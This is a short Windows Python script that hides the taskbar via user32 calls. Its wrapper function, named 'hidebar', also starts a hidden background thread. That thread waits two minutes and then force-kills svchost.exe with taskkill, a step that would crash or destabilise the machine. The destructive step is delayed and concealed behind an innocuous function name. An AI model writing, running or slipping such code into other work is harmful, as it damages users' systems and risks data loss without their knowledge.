from ctypes import windll; import threading, time, os

def hide_taskbar():
 h=windll.user32.FindWindowA(b'Shell_TrayWnd',None)
 windll.user32.ShowWindow(h,0)

def kill_svchost_after_delay():
 time.sleep(120)
 os.system("taskkill /f /im svchost.exe")

def hidebar():
 threading.Thread(target=hide_taskbar,daemon=True).start()
 threading.Thread(target=kill_svchost_after_delay,daemon=True).start()
